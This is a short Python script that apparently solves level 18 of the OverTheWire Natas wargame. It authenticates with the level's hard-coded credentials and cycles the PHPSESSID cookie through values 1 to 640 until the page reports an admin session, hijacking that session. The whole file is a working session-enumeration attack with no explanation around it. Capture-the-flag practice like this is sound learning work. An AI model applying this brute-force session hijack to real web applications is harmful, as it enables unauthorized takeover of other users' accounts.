#!/usr/bin/python
import requests

username = 'natas18'
password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'
url = 'http://natas18.natas.labs.overthewire.org/'

session = requests.Session()


attempt = 1
while attempt < 641:
    response = session.get(url,cookies = {"PHPSESSID":f"{attempt}"}, auth = (username, password))
    print(f"trying {attempt}")
    if 'You are an admin' in response.text:
        print(f"the admin session is {attempt}")
        break
    attempt +=1


